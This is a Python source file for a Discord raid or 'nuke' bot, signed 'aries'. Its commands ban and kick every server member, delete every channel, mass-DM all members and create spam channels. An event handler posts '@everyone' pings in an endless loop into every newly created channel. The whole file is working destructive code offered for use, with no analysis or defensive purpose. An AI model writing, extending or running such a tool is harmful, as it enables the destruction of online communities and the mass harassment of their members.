import discord
from discord.ext import commands
import random
import string


intents = discord.Intents.default()
intents.members = True


bot = commands.Bot(command_prefix="$",
    case_insensitive=True,
    intents=intents)

bot.remove_command("help")
spam = ["@everyone "]

CHANNEL = ["ran-by-aries", "beamed", "beamed-by-aries"]#dont skid this




@bot.event
async def on_guild_channel_create(channel):
   while True:
     await channel.send(random.choice(spam)) 
 


# dont skid this made by ! aries
@bot.command()
async def help(ctx):
	embed = discord.Embed(
	title="help! made by aries",
	description="commands help!",
	)
	embed.add_field(name="dm <message>", value="dms every member in the server", inline=False)
	embed.add_field(name="ban", value="bans every member", inline=False)
	embed.add_field(name="kick", value="kicks every member ", inline=False)
	embed.add_field(name="chanspam", value="spam makes channels", inline=False)
	embed.add_field(name="deletechan", value="deletes every channel", inline=False)
	embed.add_field(name="spam", value="spams all channels", inline=False)
	await ctx.send(embed=embed)




@bot.command()
async def chanspam(ctx, amount=10):
	for i in range(amount):
		await ctx.guild.create_text_channel(random.choice(CHANNEL))

@bot.command()
async def ban(ctx):
	for member in ctx.guild.members:
		try:
			await member.ban(reason="aries runs you ")
			print(member.name + " has been banned")
		except:
			print(member.name + " has not been banned")

@bot.command()
async def kick(ctx):
	for member in ctx.guild.members:
		try:
			await member.kick(reason="aries runs you ")
			print(member.name + " has been kicked")
		except:
			print(member.name + " has not been kicked")

@bot.command()
async def dm(ctx, *, args=None):
		members = ctx.guild.members
		for member in members:
			try:
				await member.send(args)
				print("sent " + args + " to " + member.name)

			except:
				print("didnt send " + args + " to " + member.name)

@bot.command()
async def deletechan(ctx):
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			print(channel.name + " has been deleted")
		except:
			print(channel.name + " has not been deleted")

bot.run("bot token here")